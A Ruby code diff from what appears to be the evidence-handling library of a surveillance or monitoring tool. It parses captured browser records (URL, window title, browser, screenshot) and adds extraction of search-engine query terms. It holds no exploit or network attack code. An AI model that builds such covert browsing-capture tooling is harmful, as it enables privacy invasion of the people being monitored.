@@ -1,54 +1,8 @@
 require 'rcs-common/evidence/common'
 
+require 'CGI'
+
 module RCS
-
-module UrlcaptureEvidence
-  
-  URL_VERSION = 2010071301
-
-  def content
-    path = File.join(File.dirname(__FILE__), 'content', 'url', '00' + (rand(3) + 1).to_s + '.jpg')
-    File.open(path, 'rb') {|f| f.read }
-  end
-  
-  def generate_content
-    [ content ]
-  end
-  
-  def additional_header
-    browser = [1, 2, 3, 4, 5, 6].sample
-    r = rand(3)
-    url = ['http://reader.google.com', 'https://www.facebook.com', 'http://www.stackoverflow.com'][r].to_utf16le_binary
-    window = ['Google', 'Facebook', 'Stackoverflow'][r].to_utf16le_binary
-    header = StringIO.new
-    header.write [URL_VERSION, browser, url.size, window.size].pack("I*")
-    header.write url
-    header.write window
-    
-    header.string
-  end
-  
-  def decode_additional_header(data)
-    raise EvidenceDeserializeError.new("incomplete evidence") if data.nil? or data.size == 0
-
-    binary = StringIO.new data
-
-    version, browser, url_len, window_len = binary.read(16).unpack("I*")
-    raise EvidenceDeserializeError.new("invalid log version for urlcapture") unless version == URL_VERSION
-
-    @info[:browser] = UrlEvidence::BROWSER_TYPE[browser]
-    @info[:url] = binary.read(url_len).utf16le_to_utf8
-    @info[:window] = binary.read(window_len).utf16le_to_utf8
-    #TODO: implement keyword parsing...
-    @info[:keywords] = ""
-  end
-
-  def decode_content
-    @info[:content] = @info[:chunks].first
-    return [self]
-  end
-end
-
 
 module UrlEvidence
 
@@ -56,11 +10,21 @@ module UrlEvidence
   ELEM_DELIMITER = 0xABADC0DE
   BROWSER_TYPE = ['Unknown', 'Internet Explorer', 'Firefox', 'Opera', 'Safari', 'Chrome', 'Mobile Safari']
 
+  def decode_query(url)
+    query = []
+    query = url.scan(/(?:&|^)q=([^&]*)(?:&|$)/).first if url['google']
+    query = url.scan(/(?:&|^)p=([^&]*)(?:&|$)/).first if url['yahoo']
+    query = url.scan(/(?:&|^)q=([^&]*)(?:&|$)/).first if url['bing']
+
+    return CGI::unescape query.first unless query.nil? or query.empty?
+    return ''
+  end
+
   def content
     browser = [1, 2, 3, 4, 5, 6].sample
-    r = rand(3)
-    url = ["http://reader.google.com\0", "https://www.facebook.com\0", "http://www.stackoverflow.com\0"][r].to_utf16le_binary
-    window = ["Google\0", "Facebook\0", "Stackoverflow\0"][r].to_utf16le_binary
+    r = rand(4)
+    url = ["http://www.google.it/#hl=it&source=hp&q=pippo+baudo&aq=f&aqi=g10&aql=&oq=&gs_rfai=&fp=67a9a41ace8bb1ed\0", "http://reader.google.com\0", "https://www.facebook.com\0", "http://www.stackoverflow.com\0"][r].to_utf16le_binary
+    window = ["Google Search\0", "Google Reader\0", "Facebook\0", "Stackoverflow\0"][r].to_utf16le_binary
 
     content = StringIO.new
     t = Time.now.getutc
@@ -99,6 +63,7 @@ module UrlEvidence
       @info[:browser] = BROWSER_TYPE[browser]
       window = stream.read_utf16_string
       @info[:window] = window.utf16le_to_utf8 unless window.nil?
+      @info[:keywords] = decode_query @info[:url]
 
       delim = stream.read(4).unpack("L*").first
       raise EvidenceDeserializeError.new("Malformed evidence (missing delimiter)") unless delim == ELEM_DELIMITER
@@ -111,5 +76,53 @@ module UrlEvidence
   end
 
 end
+
+module UrlcaptureEvidence
+  include UrlEvidence
+
+  URL_VERSION = 2010071301
+
+  def content
+    path = File.join(File.dirname(__FILE__), 'content', 'url', '00' + (rand(3) + 1).to_s + '.jpg')
+    File.open(path, 'rb') {|f| f.read }
+  end
+  
+  def generate_content
+    [ content ]
+  end
+  
+  def additional_header
+    browser = [1, 2, 3, 4, 5, 6].sample
+    r = rand(3)
+    url = ['http://reader.google.com', 'https://www.facebook.com', 'http://www.stackoverflow.com'][r].to_utf16le_binary
+    window = ['Google', 'Facebook', 'Stackoverflow'][r].to_utf16le_binary
+    header = StringIO.new
+    header.write [URL_VERSION, browser, url.size, window.size].pack("I*")
+    header.write url
+    header.write window
+    
+    header.string
+  end
+  
+  def decode_additional_header(data)
+    raise EvidenceDeserializeError.new("incomplete evidence") if data.nil? or data.size == 0
+
+    binary = StringIO.new data
+
+    version, browser, url_len, window_len = binary.read(16).unpack("I*")
+    raise EvidenceDeserializeError.new("invalid log version for urlcapture") unless version == URL_VERSION
+
+    @info[:browser] = BROWSER_TYPE[browser]
+    @info[:url] = binary.read(url_len).utf16le_to_utf8
+    @info[:window] = binary.read(window_len).utf16le_to_utf8
+    @info[:keywords] = decode_query @info[:url]
+  end
+
+  def decode_content
+    @info[:content] = @info[:chunks].first
+    return [self]
+  end
+end
+
 
 end # ::RCS
